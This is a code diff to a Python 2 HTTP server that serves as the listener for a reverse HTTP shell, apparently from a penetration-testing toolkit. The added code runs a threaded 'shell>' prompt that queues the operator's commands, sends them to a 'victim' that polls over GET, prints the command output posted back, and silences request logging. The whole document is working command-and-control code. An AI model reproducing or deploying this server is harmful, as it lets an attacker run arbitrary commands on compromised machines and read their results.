@@ -21,9 +21,12 @@
 
 from BaseHTTPServer import BaseHTTPRequestHandler
 from BaseHTTPServer import HTTPServer
+import threading
 import urlparse
 import re
 import os
+
+command_queue = []
 
 # url decode for postbacks
 def htc(m):
@@ -34,18 +37,28 @@ def urldecode(url):
     rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
     return rex.sub(htc,url)
 
+class CommandThread(threading.Thread):
+    def run(self):
+        while True:
+            command = raw_input("shell> ")
+
+            if (command == "quit"):
+                print "Stopping shell... (Press Ctrl+C to exit)"
+                break
+            elif (len(command.strip()) > 0):
+                command_queue.append(command)
+
 class GetHandler(BaseHTTPRequestHandler):
 
     # handle get request
     def do_GET(self):
-        # this will be our shell command
-        message = raw_input("shell> ")
         # send a 200 OK response
         self.send_response(200)
         # end headers
         self.end_headers()
         # write our command shell param to victim
-        self.wfile.write(message)
+        if len(command_queue) > 0:
+            self.wfile.write(command_queue.pop(0))
         # return out
         return
 
@@ -64,7 +77,11 @@ class GetHandler(BaseHTTPRequestHandler):
         # remove the parameter cmd
         message=message.replace("cmd=", "")
         # display the command back decrypted
-        print message
+        print "\n[*] Received output...\n {}".format(message)
+
+    def log_message(self, format, *args):
+        return
+
 
 if __name__ == '__main__':
     server = HTTPServer(('', 80), GetHandler)
@@ -90,7 +107,12 @@ if __name__ == '__main__':
     # simple try block
     try:
     # serve and listen forever
+        command_thread = CommandThread()
+        command_thread.start()
         server.serve_forever()
+
     # handle keyboard interrupts
     except KeyboardInterrupt:
         print "[!] Exiting the unencrypted webserver shell..."
+    finally:
+        server.server_close()
